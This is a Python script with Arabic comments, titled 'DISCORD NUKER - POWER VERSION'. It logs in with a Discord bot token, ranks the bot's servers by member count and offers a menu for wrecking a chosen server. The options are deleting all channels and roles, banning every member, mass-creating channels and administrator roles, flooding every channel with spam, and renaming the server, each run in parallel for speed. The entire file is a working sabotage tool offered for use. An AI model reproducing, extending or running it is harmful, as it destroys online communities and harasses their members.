#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import random
import asyncio
import discord
from discord.ext import commands
from colorama import init, Fore, Back, Style

# تهيئة الألوان
init(autoreset=True)

# البانر (شعار البداية) - بسيط وقوي
BANNER = f"""
{Back.RED}{Fore.WHITE}  ╔══════════════════════════════════════╗
{Back.RED}{Fore.WHITE}  ║      DISCORD NUKER - POWER VERSION   ║
{Back.RED}{Fore.WHITE}  ╚══════════════════════════════════════╝{Style.RESET_ALL}
"""

def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")

def show_banner(user=None):
    clear_screen()
    print(BANNER)
    if user:
        print(f"{Fore.GREEN}[+] Logged in as: {user}{Style.RESET_ALL}")

# إعداد البوت
show_banner()
TOKEN = input(f"{Fore.CYAN}> Enter Token: {Style.RESET_ALL}").strip()

# إعدادات النوايا (Intents) لتعمل كل الأوامر
intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)

selected_guild = None
running = True

@bot.event
async def on_ready():
    global selected_guild
    show_banner(bot.user.name)

    # جلب السيرفرات وترتيبها حسب عدد الأعضاء (الأقوى أولاً)
    servers = sorted(list(bot.guilds), key=lambda x: x.member_count, reverse=True)
    
    print(f"\n{Fore.YELLOW}Servers ({len(servers)}):{Style.RESET_ALL}")
    for i, s in enumerate(servers):
        print(f"  {Fore.CYAN}{i+1}. {s.name:<25} (Members: {s.member_count}){Style.RESET_ALL}")

    while True:
        try:
            idx = int(input(f"\n{Fore.CYAN}> Choose server number: {Style.RESET_ALL}")) - 1
            if 0 <= idx < len(servers):
                selected_guild = servers[idx]
                break
        except ValueError:
            pass
        print(f"{Fore.RED}[-] Invalid number{Style.RESET_ALL}")

    print(f"\n{Fore.GREEN}[+] Target: {selected_guild.name}{Style.RESET_ALL}")
    await main_menu()

async def main_menu():
    global running
    while running:
        # رسم الجدول المنظم زي ما طلبت
        print(f"\n┌─────────────────────────────────────────────────────────────┐")
        print(f"│ [1] Delete Channels   |   [2] Delete Roles     │")
        print(f"│ [3] Ban Members       |   [4] Create Channels  │")
        print(f"│ [5] Create Admin Roles|   [6] Spam Messages    │")
        print(f"│ [7] Change Server Name|   [8] Exit             │")
        print(f"└─────────────────────────────────────────────────────────────┘")

        choice = input(f"\n{Fore.CYAN}> Choose option: {Style.RESET_ALL}").strip()

        if choice == "1": await delete_channels()
        elif choice == "2": await delete_roles()
        elif choice == "3": await ban_members()
        elif choice == "4": await create_channels()
        elif choice == "5": await create_roles()
        elif choice == "6": await spam_messages()
        elif choice == "7": await change_server_name()
        elif choice == "8":
            running = False
            print(f"\n{Fore.GREEN}[+] Exiting...{Style.RESET_ALL}")
            await bot.close()
            sys.exit(0)
        else:
            print(f"{Fore.RED}[-] Invalid option{Style.RESET_ALL}")

# --- العمليات السريعة (High Speed Operations) ---

async def delete_channels():
    print(f"\n{Fore.YELLOW}[+] Deleting all channels...{Style.RESET_ALL}")
    # تنفيذ متوازي لحذف كل القنوات في نفس اللحظة
    await asyncio.gather(*[ch.delete() for ch in selected_guild.channels], return_exceptions=True)
    print(f"{Fore.GREEN}[+] Channels deleted!{Style.RESET_ALL}")

async def delete_roles():
    print(f"\n{Fore.YELLOW}[+] Deleting all roles...{Style.RESET_ALL}")
    # حذف كل الرتب ما عدا رتبة Everyone الأساسية
    roles = [r for r in selected_guild.roles if r.name != "@everyone"]
    await asyncio.gather(*[r.delete() for r in roles], return_exceptions=True)
    print(f"{Fore.GREEN}[+] Roles deleted!{Style.RESET_ALL}")

async def ban_members():
    confirm = input(f"{Fore.RED}> Ban all members? (yes/no): {Style.RESET_ALL}").lower()
    if confirm != "yes":
        print(f"{Fore.RED}[-] Cancelled{Style.RESET_ALL}")
        return
    
    print(f"\n{Fore.YELLOW}[+] Banning members...{Style.RESET_ALL}")
    try:
        # جلب الأعضاء والتعامل مع الأخطاء بشكل متوازي
        members = [m for m in selected_guild.members if m.id != bot.user.id]
        tasks = [m.ban(reason="Nuked") for m in members]
        await asyncio.gather(*tasks, return_exceptions=True)
        print(f"{Fore.GREEN}[+] Members banned!{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[-] Error banning: {e}{Style.RESET_ALL}")

async def create_channels():
    try:
        count = int(input(f"{Fore.CYAN}> How many channels?: {Style.RESET_ALL}"))
    except ValueError:
        print(f"{Fore.RED}[-] Enter a number{Style.RESET_ALL}")
        return
    
    print(f"\n{Fore.YELLOW}[+] Creating channels...{Style.RESET_ALL}")
    names = ["nuke", "hack", "3zf"]
    tasks = []
    for _ in range(count):
        tasks.append(selected_guild.create_text_channel(names[_ % len(names)]))
    
    await asyncio.gather(*tasks, return_exceptions=True)
    print(f"{Fore.GREEN}[+] Created {count} channels!{Style.RESET_ALL}")

async def create_roles():
    try:
        count = int(input(f"{Fore.CYAN}> How many roles?: {Style.RESET_ALL}"))
    except ValueError:
        print(f"{Fore.RED}[-] Enter a number{Style.RESET_ALL}")
        return
    
    print(f"\n{Fore.YELLOW}[+] Creating admin roles...{Style.RESET_ALL}")
    tasks = []
    for _ in range(count):
        color = random.randint(0, 0xFFFFFF)
        tasks.append(selected_guild.create_role(name="nuke", color=discord.Color(color=color), permissions=discord.Permissions(administrator=True)))
    
    await asyncio.gather(*tasks, return_exceptions=True)
    print(f"{Fore.GREEN}[+] Created {count} admin roles!{Style.RESET_ALL}")

async def spam_messages():
    try:
        count = int(input(f"{Fore.CYAN}> Messages per channel?: {Style.RESET_ALL}"))
    except ValueError:
        print(f"{Fore.RED}[-] Enter a number{Style.RESET_ALL}")
        return
        
    msg = input(f"{Fore.CYAN}> Message content: {Style.RESET_ALL}")
    
    # إنشاء مهام السبام لكل القنوات دفعة واحدة
    tasks = []
    for ch in selected_guild.text_channels:
        for _ in range(count):
            tasks.append(ch.send(msg))
            
    await asyncio.gather(*tasks, return_exceptions=True)
    print(f"{Fore.GREEN}[+] Spam finished!{Style.RESET_ALL}")

async def change_server_name():
    name = input(f"{Fore.CYAN}> New server name: {Style.RESET_ALL}")
    try:
        await selected_guild.edit(name=name)
        print(f"{Fore.GREEN}[+] Server name changed to: {name}{Style.RESET_ALL}")
    except Exception:
        print(f"{Fore.RED}[-] Failed to change name{Style.RESET_ALL}")

# تشغيل البوت
if __name__ == "__main__":
    try:
        bot.run(TOKEN)
    except Exception:
        print(f"{Fore.RED}[-] Invalid token{Style.RESET_ALL}")
        sys.exit(1)
